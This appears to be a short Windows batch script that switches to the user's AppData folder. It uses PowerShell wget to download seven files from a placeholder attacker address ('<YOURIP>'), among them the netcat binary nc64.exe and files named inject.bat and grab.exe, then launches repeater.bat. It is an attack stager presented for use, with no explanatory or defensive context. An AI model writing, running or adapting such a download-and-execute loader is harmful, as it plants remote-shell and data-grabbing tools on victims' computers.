cd C:\Users\%USERNAME%\AppData\

powershell wget 'http://<YOURIP>/nc64.exe' -OutFile nc64.exe
powershell wget 'http://<YOURIP>/setup.vbs' -OutFile setup.vbs
powershell wget 'http://<YOURIP>/inject.bat' -OutFile inject.bat
powershell wget 'http://<YOURIP>/grab.exe' -OutFile grab.exe
powershell wget 'http://<YOURIP>/grab.vbs' -OutFile grab.vbs
powershell wget 'http://<YOURIP>/grab.bat' -OutFile grab.bat
powershell wget 'http://<YOURIP>/repeater.bat' -OutFile repeater.bat

start repeater.bat
